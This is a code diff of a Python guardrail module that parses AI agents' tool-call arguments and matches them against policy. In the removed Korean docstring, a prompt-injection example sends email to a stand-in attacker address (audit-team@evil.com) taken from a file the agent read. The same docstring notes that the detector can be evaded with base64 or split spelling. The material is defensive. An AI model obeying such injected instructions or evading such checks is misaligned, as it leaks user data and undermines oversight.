@@ -1,28 +1,22 @@
-"""Argument provenance — §8 의 3단계.
+"""Decode tool calls and their string argument paths."""
 
-```
-send_email(to = "audit-team@evil.com")
-                    │
-   사용자 메시지에 있나?    없음
-   시스템 프롬프트에 있나?  없음
-   방금 읽은 파일에 있나?   ★ 있음
-                    ▼
-   사용자가 말한 적 없는 주소가 외부 파일에서 나왔다
-   = 데이터가 지시로 바뀐 증거
-```
-
-**실전에서 통하는 이유:** 공격자는 목적지를 반드시 적어야 한다. 메일 주소·URL·파일
-경로를 툴 결과 안에 써놓지 않으면 공격이 성립하지 않는다. 정상적인 경우 그 값은 사용자
-메시지나 시스템 프롬프트에서 온다 — **출처가 다르다.**
-
-⚠️ **근사법이다** (§8 한계). "문자열이 그대로 나타나는지"만 본다. base64·철자 쪼개기로
-변형하면 우회된다. 1·2단계(오염 여부, 툴 종류)는 구조적 사실이라 우회가 어렵고, 이것은
-그 위에 얹는 보강이다. 정교하게 만들수록 과신 위험이 커진다는 점을 잊지 말 것.
-"""
-
+from dataclasses import dataclass
 from typing import Any
 
 import orjson
+
+from gateway.guardrail.domain.models.guardrail import TOOL_SELECTOR_INCLUDE
+
+_JOIN = " "
+_UNKNOWN_TOOL_NAME = "(unknown)"
+
+
+@dataclass(frozen=True, slots=True)
+class ParsedArguments:
+    """String argument paths plus whether JSON decoding failed."""
+
+    values: tuple[tuple[str, str], ...] = ()
+    parse_failed: bool = False
 
 
 def extract_tool_calls(body: Any) -> list[dict]:
@@ -68,11 +62,16 @@ def argument_strings(tool_call: Any) -> list[tuple[str, str]]:
     OpenAI 형식은 ``function.arguments`` 를 **JSON 문자열**로 준다. 파싱이 실패하면 값이
     없는 것으로 본다 — 우리가 먼저 터지면 가드레일이 가용성 문제가 된다.
     """
+    return list(parse_argument_strings(tool_call).values)
+
+
+def parse_argument_strings(tool_call: Any) -> ParsedArguments:
+    """Decode string arguments without hiding a malformed JSON string."""
     if not isinstance(tool_call, dict):
-        return []
+        return ParsedArguments()
     function = tool_call.get("function")
     if not isinstance(function, dict):
-        return []
+        return ParsedArguments()
 
     raw = function.get("arguments")
     if isinstance(raw, dict):
@@ -81,13 +80,42 @@ def argument_strings(tool_call: Any) -> list[tuple[str, str]]:
         try:
             parsed = orjson.loads(raw)
         except orjson.JSONDecodeError:
-            return []
+            return ParsedArguments(parse_failed=True)
     else:
-        return []
+        return ParsedArguments()
 
     found: list[tuple[str, str]] = []
     _walk(parsed, "", found)
-    return found
+    return ParsedArguments(values=tuple(found))
+
+
+def tool_selected(name: str, selector: str, tools: frozenset[str]) -> bool:
+    """Apply a tool selector with the fail-safe missing-name rule."""
+    if not name:
+        return True
+    if selector == TOOL_SELECTOR_INCLUDE:
+        return name in tools
+    return name not in tools
+
+
+def tool_extract_text(name: str, arguments: ParsedArguments, field: str) -> str:
+    """Extract one tool-call field as policy text."""
+    if field == "name":
+        # 이름을 못 읽은 호출도 선택된 툴이다. 빈 문자열을 넣으면 migration의
+        # regex(".")가 거짓이 돼 기존 side_effect 정책이 fail-open 한다.
+        return name or _UNKNOWN_TOOL_NAME
+    if field == "arguments":
+        return _JOIN.join(value for _, value in arguments.values)
+    return _JOIN.join(value for path, value in arguments.values if _path_matches(field, path))
+
+
+def tool_extract_paths(arguments: ParsedArguments, field: str) -> tuple[str, ...]:
+    """Return only argument path names suitable for audit evidence."""
+    if field == "name":
+        return ()
+    if field == "arguments":
+        return tuple(path for path, _ in arguments.values)
+    return tuple(path for path, _ in arguments.values if _path_matches(field, path))
 
 
 def foreign_arguments(
@@ -132,9 +160,38 @@ def _walk(value: Any, path: str, found: list[tuple[str, str]]) -> None:
             _walk(item, f"{path}[{index}]", found)
 
 
+def _path_matches(pattern: str, path: str) -> bool:
+    """Match an argument path, where ``[*]`` consumes one array index."""
+    pattern_index = 0
+    path_index = 0
+    while pattern_index < len(pattern):
+        if pattern.startswith("[*]", pattern_index):
+            if path_index >= len(path) or path[path_index] != "[":
+                return False
+            path_index += 1
+            digits_start = path_index
+            while path_index < len(path) and path[path_index].isdigit():
+                path_index += 1
+            if path_index == digits_start or path_index >= len(path) or path[path_index] != "]":
+                return False
+            path_index += 1
+            pattern_index += 3
+            continue
+        if path_index >= len(path) or pattern[pattern_index] != path[path_index]:
+            return False
+        pattern_index += 1
+        path_index += 1
+    return path_index == len(path)
+
+
 __all__ = [
+    "ParsedArguments",
     "argument_strings",
     "extract_tool_calls",
     "foreign_arguments",
+    "parse_argument_strings",
+    "tool_extract_paths",
+    "tool_extract_text",
     "tool_name",
+    "tool_selected",
 ]
